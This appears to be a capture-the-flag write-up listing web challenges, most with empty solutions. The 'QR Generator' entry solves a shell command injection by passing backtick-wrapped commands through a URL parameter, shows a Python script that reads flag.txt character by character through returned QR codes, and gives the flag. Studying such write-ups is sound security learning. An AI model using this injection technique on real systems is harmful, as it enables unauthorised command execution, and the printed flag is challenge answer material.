# I don't like needles
### Points 50
They make me SQueaL!

http://challs.houseplant.riceteacatpanda.wtf:30001

Dev: Tom 
### Solution:
### Flag:

# QR Generator
### Points  50
I was playing around with some stuff on my computer and found out that you can generate QR codes! I tried to make an online QR code generator, but it seems that's not working like it should be. Would you mind taking a look?

http://challs.houseplant.riceteacatpanda.wtf:30004

Dev: jammy

Hint! For some reason, my website isn't too fond of backticks...
### Solution:
The hint for this one is pretty obvious that the input on this QR generator web app is likely not sanitized and will lead to some kind of injection attack.

I did some test executions by hand and realized that the returned QR code seemed to only contain a single character, so I wrote up a script that would make the request over and over, grabbing the next character each time.

I ran this script with `ls` initially and saw there was a `flag.txt` file in the directory, so I then used the same script to cat the file.

```python
#!/usr/bin/python

import urllib.parse
import urllib.request
from pyzbar.pyzbar import decode
from PIL import Image
import io
import sys

for num in range(1,50):
  cmd=urllib.parse.quote("`cat flag.txt | head -c "+str(num)+"| tail -c 1`")

  with urllib.request.urlopen('http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text='+cmd) as response:
    html = response.read()
    image = Image.open(io.BytesIO(html))
    decoded = decode(image)[0]
    sys.stdout.write(decoded.data.decode('utf8'))

print()

```

### Flag:
rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}

# Selfhost all the things!
### Points 1566
The amount of data that online services like Discord and Instagram collect on us is staggering, so I thought I'd selfhost a chat app!

http://challs.houseplant.riceteacatpanda.wtf:30005

The chat database is wiped every hour.

This app is called Mantle and is open source. You can find its GitHub repo at https://github.com/nektro/mantle.

Dev: Tom

Hint! discord more like flag
### Solution:
### Flag:

# Fire/place
### Points  1783
You see, I built a nice fire/place for us to all huddle around. It's completely decentralized, and we can all share stuff in it for fun!!

Dev: Jess

Hint! I wonder... what's inside the HTML page?
### Solution:
### Flag:

# Blog from the future
### Points 1922
My friend Bob likes sockets so much, he made his own blog to talk about them. Can you check it out and make sure that it's secure like he assured me it is?

http://challs.houseplant.riceteacatpanda.wtf:30003

Dev: jammy 
### Solution:
### Flag:
